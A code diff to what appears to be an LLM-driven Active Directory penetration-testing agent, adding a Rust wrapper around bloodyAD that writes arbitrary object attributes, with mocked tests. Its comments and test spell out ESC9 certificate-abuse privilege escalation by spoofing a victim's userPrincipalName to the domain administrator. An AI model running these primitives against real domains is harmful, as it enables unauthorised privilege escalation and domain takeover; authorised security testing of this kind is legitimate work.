@@ -279,6 +279,44 @@ pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
+/// Modify an arbitrary attribute on an AD object via `bloodyAD set object`.
+///
+/// Required args: `domain`, `username`, `password`, `dc_ip`, `target`,
+/// `attribute`, `value`.
+///
+/// `target` is the SAM account name or DN of the object being modified.
+/// `attribute` is the LDAP attribute name (e.g. `userPrincipalName`,
+/// `userAccountControl`, `servicePrincipalName`).
+/// `value` is the new value to write.
+///
+/// Used by ESC9 (UPN spoofing — set `userPrincipalName` to
+/// `administrator@<domain>` on a user we have GenericAll on), ESC10
+/// Case 2 (clear `userPrincipalName` to bypass implicit cert mapping),
+/// and any other primitive where the LLM needs to write a single
+/// attribute without granting itself a DACL right first.
+pub async fn bloodyad_set_object_attr(args: &Value) -> Result<ToolOutput> {
+    let domain = required_str(args, "domain")?;
+    let username = required_str(args, "username")?;
+    let password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let target = required_str(args, "target")?;
+    let attribute = required_str(args, "attribute")?;
+    let value = required_str(args, "value")?;
+
+    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+
+    CommandBuilder::new("bloodyAD")
+        .args(creds)
+        .arg("set")
+        .arg("object")
+        .arg(target)
+        .arg(attribute)
+        .flag("-v", value)
+        .timeout_secs(60)
+        .execute()
+        .await
+}
+
 /// Edit DACLs via `dacledit.py`.
 ///
 /// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`, `rights`, `target_dn`
@@ -924,6 +962,55 @@ mod tests {
             "dc_ip": "192.168.58.1", "target_dn": "CN=Users,DC=contoso,DC=local", "principal": "jsmith"
         });
         assert!(super::bloodyad_add_genericall(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn bloodyad_set_object_attr_executes() {
+        mock::push(mock::success());
+        // ESC9-style invocation: spoof a victim user's UPN to the
+        // built-in administrator so a certipy-issued cert authenticates
+        // as administrator.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "password": "P@ssw0rd!",   // pragma: allowlist secret
+            "dc_ip": "192.168.58.10",
+            "target": "victim_user",
+            "attribute": "userPrincipalName",
+            "value": "administrator@contoso.local"
+        });
+        assert!(super::bloodyad_set_object_attr(&args).await.is_ok());
+    }
+
+    #[test]
+    fn bloodyad_set_object_attr_requires_all_fields() {
+        // Each missing field should error — confirms the schema is enforced
+        // by `required_str` at the implementation level (defence in depth
+        // against the LLM omitting fields the JSON schema also requires).
+        for field in &[
+            "domain",
+            "username",
+            "password",
+            "dc_ip",
+            "target",
+            "attribute",
+            "value",
+        ] {
+            let mut args = json!({
+                "domain": "contoso.local",
+                "username": "alice",
+                "password": "P@ssw0rd!",   // pragma: allowlist secret
+                "dc_ip": "192.168.58.10",
+                "target": "victim_user",
+                "attribute": "userPrincipalName",
+                "value": "administrator@contoso.local"
+            });
+            args.as_object_mut().unwrap().remove(*field);
+            assert!(
+                required_str(&args, field).is_err(),
+                "expected required_str({field}) to error"
+            );
+        }
     }
 
     #[tokio::test]
